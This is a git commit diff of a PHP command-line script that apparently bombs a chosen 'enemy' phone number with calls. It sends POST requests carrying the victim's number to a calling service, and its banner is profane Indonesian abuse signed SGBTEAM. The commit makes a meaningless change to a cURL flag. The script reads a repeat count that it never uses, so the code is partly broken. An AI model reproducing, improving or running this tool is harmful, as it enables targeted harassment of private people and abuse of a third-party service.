e6dc40b414df2aa8b79c8d8dd743a482efd13c56
Rahul4960 <57430177+Rahul4960@users.noreply.github.com>
2019-11-07 16:50:12 +0800

    Update call4ndre4s5.php

--- call4ndre4s5.php
+++ call4ndre4s5.php
@@ -7,16 +7,17 @@ function send($phone){
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_HEADER, true);
-        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POST, 10);
         curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
         curl_close($ch);
                 echo $asw."\n";
 }
+
+
 echo "Lo Ngapain Di Script Gua Babi ? Jangan Tau Make Aja Babi Lu Tau Memek Gak ? Itu Kesukaan Gua Anjing ; SGBTEAM\n\n";
 echo "NomorMusuhAnjing\nLoTauInputGakBabi? : ";
 $nomor = trim(fgets(STDIN));
 $jumlah = trim (fgets(STDIN));
 $execute = send($nomor);
 print $execute;
-# echo "Telah Terkirim"
 ?>
